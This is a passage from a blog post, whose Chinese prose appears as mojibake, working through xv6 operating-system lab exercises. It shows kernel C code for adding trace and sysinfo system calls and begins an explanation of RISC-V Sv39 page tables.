class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>.....<br><br>[SYS_trace]   sys_trace,<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åœ¨proc.hçš„procç»“æ„ä½“ä¸­æ·»åŠ å­—æ®µmask</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Per-process state</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>åœ¨sysproc.cä¸­æ·»åŠ sys_traceï¼Œç…§çŒ«ç”»è™ï¼Œå¯ä»¥å‚è€ƒforkçš„å®ç°ã€‚å…¶ä¸­argintè·å–traceçš„å‚æ•°ï¼Œä¹Ÿå³æ˜¯maskã€‚å°†å½“å‰è¿›ç¨‹çš„maskå­—æ®µè®¾ç½®ä¸ºè¦è¿½è¸ªçš„å‚æ•°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_trace</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> mask;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;mask) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//è·å–traceçš„å‚æ•°ï¼šmask</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>myproc()-&gt;mask=mask;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¿®æ”¹ fork ()(å‚è§ kernel/proc.c) ï¼Œè·Ÿè¸ªæ©ç ä»çˆ¶è¿›ç¨‹å¤åˆ¶åˆ°å­è¿›ç¨‹</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// Create a new process, copying the parent.</span><br><span class="hljs-comment">// Sets up child kernel stack to return as if from fork() system call.</span><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> i, pid;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">np</span>;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<br><br>  <span class="hljs-comment">// Allocate process.</span><br>  <span class="hljs-keyword">if</span>((np = allocproc()) == <span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br><br>  <span class="hljs-comment">// Copy user memory from parent to child.</span><br>  <span class="hljs-keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="hljs-number">0</span>)&#123;<br>    freeproc(np);<br>    release(&amp;np-&gt;lock);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  np-&gt;sz = p-&gt;sz;<br><br>  np-&gt;parent = p;<br><br>  <span class="hljs-comment">// copy saved user registers.</span><br>  *(np-&gt;trapframe) = *(p-&gt;trapframe);<br><br>  <span class="hljs-comment">// Cause fork to return 0 in the child.</span><br>  np-&gt;trapframe-&gt;a0 = <span class="hljs-number">0</span>;<br><br>  <span class="hljs-comment">// increment reference counts on open file descriptors.</span><br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; NOFILE; i++)<br>    <span class="hljs-keyword">if</span>(p-&gt;ofile[i])<br>      np-&gt;ofile[i] = filedup(p-&gt;ofile[i]);<br>  np-&gt;cwd = idup(p-&gt;cwd);<br><br>  safestrcpy(np-&gt;name, p-&gt;name, <span class="hljs-keyword">sizeof</span>(p-&gt;name));<br><br>  pid = np-&gt;pid;<br><br>  np-&gt;state = RUNNABLE;<br><br>  release(&amp;np-&gt;lock);<br><br>  np-&gt;mask=p-&gt;mask;<span class="hljs-comment">//ç»™å­è¿›ç¨‹çš„maskèµ‹å€¼</span><br><br>  <span class="hljs-keyword">return</span> pid;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>æ·»åŠ è¦ç´¢å¼•åˆ°çš„ç³»ç»Ÿè°ƒç”¨åç§°æ•°ç»„</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span>  *syscall_name[] = &#123;<br>  <span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;fork&quot;</span>, <span class="hljs-string">&quot;exit&quot;</span>, <span class="hljs-string">&quot;wait&quot;</span>, <span class="hljs-string">&quot;pipe&quot;</span>, <span class="hljs-string">&quot;read&quot;</span>,<br>  <span class="hljs-string">&quot;kill&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;fstat&quot;</span>, <span class="hljs-string">&quot;chdir&quot;</span>, <span class="hljs-string">&quot;dup&quot;</span>, <span class="hljs-string">&quot;getpid&quot;</span>, <span class="hljs-string">&quot;sbrk&quot;</span>, <span class="hljs-string">&quot;sleep&quot;</span>,<br>  <span class="hljs-string">&quot;uptime&quot;</span>, <span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;write&quot;</span>, <span class="hljs-string">&quot;mknod&quot;</span>, <span class="hljs-string">&quot;unlink&quot;</span>, <span class="hljs-string">&quot;link&quot;</span>, <span class="hljs-string">&quot;mkdir&quot;</span>,<span class="hljs-string">&quot;close&quot;</span>,<span class="hljs-string">&quot;trace&quot;</span>,<span class="hljs-string">&quot;sysinfo&quot;</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>ä¿®æ”¹ kernel/syscall.c ä¸­çš„ syscall ()å‡½æ•°ä»¥æ‰“å°è·Ÿè¸ªè¾“å‡º</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">syscall</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> num;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span> =</span> myproc();<span class="hljs-comment">//myproc()ï¼šå®ï¼Œå½“å‰çš„è¿›ç¨‹</span><br>  <span class="hljs-comment">// trap ä»£ç å°†ç”¨æˆ·å¯„å­˜å™¨ä¿å­˜åˆ°å½“å‰è¿›ç¨‹çš„ trapframe ä¸­</span><br>  num = p-&gt;trapframe-&gt;a7;<span class="hljs-comment">//numæ˜¯ç³»ç»Ÿè°ƒç”¨å·</span><br>  <span class="hljs-keyword">if</span>(num &gt; <span class="hljs-number">0</span> &amp;&amp; num &lt; NELEM(syscalls) &amp;&amp; syscalls[num]) &#123;<br>    p-&gt;trapframe-&gt;a0 = syscalls[num]();<span class="hljs-comment">//a0ä¿å­˜è¿”å›å€¼</span><br>    <span class="hljs-keyword">if</span>((p-&gt;mask&gt;&gt;num)&amp;<span class="hljs-number">1</span>)<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscall_name[num],p-&gt;trapframe-&gt;a0);<span class="hljs-comment">//è¿›ç¨‹idã€ç³»ç»Ÿè°ƒç”¨çš„åç§°ã€è¿”å›å€¼</span><br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d %s: unknown sys call %d\n&quot;</span>,<br>            p-&gt;pid, p-&gt;name, num);<br>    p-&gt;trapframe-&gt;a0 = <span class="hljs-number">-1</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">$ trace 32 grep hello README</span><br><span class="hljs-comment">3: syscall read -&gt; 1023</span><br><span class="hljs-comment">3: syscall read -&gt; 966</span><br><span class="hljs-comment">3: syscall read -&gt; 70</span><br><span class="hljs-comment">3: syscall read -&gt; 0</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><p>In this assignment you will add a system call, <code>sysinfo</code>, that collects information about the running system. The system call takes one argument: a pointer to a <code>struct sysinfo</code> (see <code>kernel/sysinfo.h</code>). The kernel should fill out the fields of this struct: the <code>freemem</code> field should be set to the number of bytes of free memory, and the <code>nproc</code> field should be set to the number of processes whose <code>state</code> is not <code>UNUSED</code>. We provide a test program <code>sysinfotest</code>; you pass this assignment if it prints â€œsysinfotest: OKâ€.</p><p>ä»»åŠ¡ï¼šæ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨ sysinfoï¼Œå®ƒæ”¶é›†å…³äºæ­£åœ¨è¿è¡Œçš„ç³»ç»Ÿçš„ä¿¡æ¯</p><ul><li>ç³»ç»Ÿè°ƒç”¨æœ‰ä¸€ä¸ªå‚æ•°: ä¸€ä¸ªæŒ‡å‘ struct sysinfo çš„æŒ‡é’ˆ(å‚è§ kernel/sysinfo.h)</li><li>å†…æ ¸åº”è¯¥å¡«å……è¿™ä¸ªç»“æ„çš„å­—æ®µ:<ul><li>freemem å­—æ®µåº”è¯¥è®¾ç½®ä¸ºå¯ç”¨å†…å­˜çš„å­—èŠ‚æ•°</li><li>nproc å­—æ®µåº”è¯¥è®¾ç½®ä¸ºçŠ¶æ€ä¸æ˜¯ UNUSED çš„è¿›ç¨‹æ•°</li></ul></li></ul><p>Sysinfo éœ€è¦å°†ä¸€ä¸ª struct sysinfo å¤åˆ¶å›ç”¨æˆ·ç©ºé—´; è¯·å‚é˜… sys_fstat ()(kernel/sysfile.c)å’Œ filestat()(kernel/file.c)ä»¥è·å¾—å¦‚ä½•ä½¿ç”¨ copy out ()å®ç°è¿™ä¸€ç‚¹çš„ç¤ºä¾‹ã€‚</p><ul><li>æ·»åŠ $U/_sysinfotest</li><li>ä¸ºäº†æ”¶é›†ç©ºé—²å†…å­˜é‡ï¼Œå‘ kernel/kalloc.c æ·»åŠ ä¸€ä¸ªå‡½æ•°getFreeByte()</li></ul><p>è¿™å—é‡ç‚¹æ˜¯ç†è§£runã€kmemç»“æ„ä½“çš„å®ç°ï¼Œå¹¶çŸ¥é“è®¿é—®èµ„æºçš„æ—¶å€™éœ€è¦åŠ é”ã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹kalloc.cæ–‡ä»¶ä¸­åˆ«çš„å‡½æ•°çš„å®ç°ï¼Œå¾ˆå¤šåœ°æ–¹ç›´æ¥å¥—ç”¨å°±è¡Œ</p><ul><li>kmem.freelistæ˜¯ç©ºé—²é“¾è¡¨ï¼Œå½“é“¾è¡¨çš„nextæŒ‡é’ˆä¸ä¸ºç©ºæ—¶è¯´æ˜æœ‰ä¸€ä¸ªç©ºé—²èµ„æºå—ï¼Œéå†æ¬¡æ•°å°±æ˜¯é¡µçš„æ•°é‡</li><li>ç”±äºè¦æ±‚æ±‚å‡ºå­—èŠ‚ï¼Œå› æ­¤éœ€è¦<code>return PGSIZE*total;</code>ï¼ˆæ¯é¡µçš„å­—èŠ‚æ•°ä¹˜ä»¥totalï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getFreeByte</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">run</span> *<span class="hljs-title">p</span>;</span><br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br><br>  acquire(&amp;kmem.lock);<span class="hljs-comment">//åŠ é”</span><br>  p=kmem.freelist;<br>  <span class="hljs-keyword">while</span>(p)<br>  &#123;<br>    total++;<br>    p=p-&gt;next;<br>  &#125;<br>  release(&amp;kmem.lock);<br>  <span class="hljs-keyword">return</span> PGSIZE*total;<span class="hljs-comment">//æ¯é¡µçš„å­—èŠ‚æ•°*total</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li>ä¸ºäº†æ”¶é›†è¿›ç¨‹æ•°ï¼Œå‘ kernel/proc.c æ·»åŠ ä¸€ä¸ªå‡½æ•°getProcNum()</li></ul><p>proc.cä¸­æœ‰ä¸€ä¸ªå…¨å±€å˜é‡proc[NPROC]ï¼Œproc[0]æ˜¯ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œproc[NPROC-1]æ˜¯æœ€åä¸€ä¸ªè¿›ç¨‹ï¼Œç›´æ¥forå¾ªç¯éå†å³å¯å¾—åˆ°æ‰€æœ‰çš„è¿›ç¨‹ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œç„¶åå–å‡ºè¯¥æŒ‡é’ˆçš„stateå­—æ®µå’ŒUNUSEDæ¯”è¾ƒå³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> <span class="hljs-title">proc</span>[<span class="hljs-title">NPROC</span>];</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> &#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">spinlock</span> <span class="hljs-title">lock</span>;</span><br><br>  <span class="hljs-comment">// p-&gt;lock must be held when using these:</span><br>  <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">procstate</span> <span class="hljs-title">state</span>;</span>        <span class="hljs-comment">// Process state</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">parent</span>;</span>         <span class="hljs-comment">// Parent process</span><br>  <span class="hljs-keyword">void</span> *chan;                  <span class="hljs-comment">// If non-zero, sleeping on chan</span><br>  <span class="hljs-keyword">int</span> killed;                  <span class="hljs-comment">// If non-zero, have been killed</span><br>  <span class="hljs-keyword">int</span> xstate;                  <span class="hljs-comment">// Exit status to be returned to parent&#x27;s wait</span><br>  <span class="hljs-keyword">int</span> pid;                     <span class="hljs-comment">// Process ID</span><br><br>  <span class="hljs-comment">// these are private to the process, so p-&gt;lock need not be held.</span><br>  uint64 kstack;               <span class="hljs-comment">// Virtual address of kernel stack</span><br>  uint64 sz;                   <span class="hljs-comment">// Size of process memory (bytes)</span><br>  <span class="hljs-keyword">pagetable_t</span> pagetable;       <span class="hljs-comment">// User page table</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">trapframe</span>;</span> <span class="hljs-comment">// data page for trampoline.S</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>      <span class="hljs-comment">// swtch() here to run process</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">ofile</span>[<span class="hljs-title">NOFILE</span>];</span>  <span class="hljs-comment">// Open files</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">inode</span> *<span class="hljs-title">cwd</span>;</span>           <span class="hljs-comment">// Current directory</span><br>  <span class="hljs-keyword">char</span> name[<span class="hljs-number">16</span>];               <span class="hljs-comment">// Process name (debugging)</span><br>  <span class="hljs-keyword">int</span> mask;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getProcNum</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> total=<span class="hljs-number">0</span>;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>;</span><br><br>  <span class="hljs-keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) <br>  &#123;<br>    acquire(&amp;p-&gt;lock);<br>    <span class="hljs-keyword">if</span>(p-&gt;state!=UNUSED)<br>      total++;<br>    release(&amp;p-&gt;lock);<br>  &#125;<br>  <span class="hljs-keyword">return</span> total;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>åœ¨sysproc.cä¸­æ·»åŠ å‡½æ•°sys_sysinfo(void)<ul><li>ä½¿ç”¨argaddrå‡½æ•° ä» trapframe ä¸­ä»¥æŒ‡é’ˆçš„å½¢å¼æ£€ç´¢ç¬¬ n ä¸ªç³»ç»Ÿè°ƒç”¨ï¼Œå…³äºargaddrå‡½æ•°çš„ç”¨æ³•ï¼Œåœ¨æ–‡ä»¶çš„åˆ«çš„å‡½æ•°å¤„å¯ä»¥å‚è€ƒ</li><li>å£°æ˜ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡ï¼Œç„¶åä½¿ç”¨ä¹‹å‰å†™å¥½çš„ä¸¤ä¸ªå‡½æ•°å¯¹å®ƒè¿›è¡Œèµ‹å€¼</li><li>ç”±äºéœ€è¦å°†ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡èµ‹å€¼å›ç”¨æˆ·ç©ºé—´ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨copyoutå‡½æ•°ï¼Œæ³¨æ„è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•ï¼Œæ¯”è¾ƒéš¾å†™å¯¹ã€‚ä¸€å®šè¦æœ‰<code>if(xxx) return -1 ;</code>çš„å½¢å¼ï¼Œä¸ç„¶çš„è¯ä¼šæŠ¥é”™ï¼ˆåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼‰</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sysinfo</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-comment">/*int sysinfo(struct sysinfo *)</span><br><span class="hljs-comment">  struct sysinfo &#123;</span><br><span class="hljs-comment">  uint64 freemem;   // amount of free memory (bytes)</span><br><span class="hljs-comment">  uint64 nproc;     // number of process</span><br><span class="hljs-comment">  &#125;;</span><br><span class="hljs-comment">  */</span><br><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc</span> *<span class="hljs-title">p</span>=</span>myproc();<br>  uint64 addr;<br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sysinfo</span> <span class="hljs-title">res</span>;</span><span class="hljs-comment">//æ³¨æ„è¿™é‡Œä¸å¯ä»¥æ˜¯æŒ‡é’ˆï¼Œéœ€è¦å£°æ˜ä¸€ä¸ªsysinfoç±»å‹çš„ç»“æ„ä½“å˜é‡</span><br><br>  <span class="hljs-keyword">if</span>(argaddr(<span class="hljs-number">0</span>, &amp;addr) &lt; <span class="hljs-number">0</span>)<span class="hljs-comment">//addræ˜¯æŒ‡å‘sysinfoç»“æ„ä½“çš„æŒ‡é’ˆ</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <br>  res.freemem=getFreeByte();<br>  res.nproc=getProcNum();<br><br>  <span class="hljs-keyword">if</span>(copyout(p-&gt;pagetable, addr, (<span class="hljs-keyword">char</span>*)&amp;res, <span class="hljs-keyword">sizeof</span>(res))&lt;<span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br><span class="hljs-comment">/* å¦‚æœè¿™æ ·å†™ä¼šå¤±è´¥</span><br><span class="hljs-comment">  copyout(p-&gt;pagetable, addr, (char*)&amp;res, sizeof(res));</span><br><span class="hljs-comment">*/</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰ä¸€äº›å¤´æ–‡ä»¶çš„æ·»åŠ ï¼Œå‡½æ•°æˆ–è€…ç»“æ„ä½“çš„å£°æ˜ã€å®šä¹‰çš„ç»†èŠ‚ï¼Œæš‚ä¸”ç•¥è¿‡</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202303212225098.png"></p><h1 id="Lab3-pgtable"><a href="#Lab3-pgtable" class="headerlink" title="Lab3 pgtable"></a>Lab3 pgtable</h1><p>å†™åœ¨labå¼€å§‹ä¹‹å‰ï¼š</p><ul><li><del>è¿™ä¸ªlabå¾ˆæ˜æ˜¾å’Œå‰é¢ä¸æ˜¯ä¸€ä¸ªéš¾åº¦</del></li><li>éœ€è¦è¡¥å……ä¸€äº›è™šæ‹Ÿå†…å­˜çš„çŸ¥è¯†<ul><li>çœ‹ä¸€ä¸‹é…å¥—çš„xv6æŒ‡å¯¼æ‰‹å†Œ</li><li>Bç«™çš„è¯¾ç¨‹è§†é¢‘å½•æ’­</li></ul></li></ul><h2 id="é¡µè¡¨"><a href="#é¡µè¡¨" class="headerlink" title="é¡µè¡¨"></a>é¡µè¡¨</h2><p>è™šæ‹Ÿåœ°å€ä¸­é—´çš„indexæœ‰27ä½ï¼Œå› æ­¤é¡µè¡¨é¡¹å°±æœ‰<code>2^27</code>ä¸ªï¼Œä¹Ÿå³æ˜¯<code>0~2^27-1</code>ï¼Œå°†indexå¯¹åº”çš„PPNå–å‡ºå’Œoffsetæ‹¼åœ¨ä¸€èµ·å°±æˆäº†PAï¼ˆphysical addressï¼‰</p><p>xv6 è¿è¡Œåœ¨ Sv39 RISC-V ä¸Šï¼Œè¿™æ„å‘³ç€åªä½¿ç”¨ 64 ä½è™šæ‹Ÿåœ°å€çš„åº•éƒ¨ 39 ä½ï¼Œé¡¶éƒ¨ 25 ä½æœªè¢«ä½¿ç”¨ã€‚å› æ­¤ä¸‹é¢å›¾ä¸­åªéœ€è¦å…³æ³¨ä½39ä½</p><p><img src="https://cdn.jsdelivr.net/gh/LaPhilosophie/image/img/202304171551847.png"></p><p>åˆšåˆšæ˜¯å•çº§é¡µè¡¨ï¼Œä½†æ˜¯å‡ºäºä¸€äº›è€ƒè™‘ï¼Œxv6ä½¿ç”¨ä¸‰çº§é¡µè¡¨çš„æ˜ å°„æ–¹å¼</p><p>Qï¼š3çº§page tableä¸ºä»€ä¹ˆä¼šæ¯”ä¸€ä¸ªè¶…å¤§çš„page tableæ›´å¥½å‘¢ï¼Ÿ</p><blockquote><p>Fransæ•™æˆï¼šè¿™æ˜¯ä¸ªå¥½é—®é¢˜ï¼Œè¿™çš„åŸå› æ˜¯ï¼Œ3çº§page tableä¸­ï¼Œå¤§é‡çš„PTEéƒ½å¯ä»¥ä¸å­˜å‚¨ã€‚æ¯”å¦‚ï¼Œå¯¹äºæœ€é«˜çº§çš„page 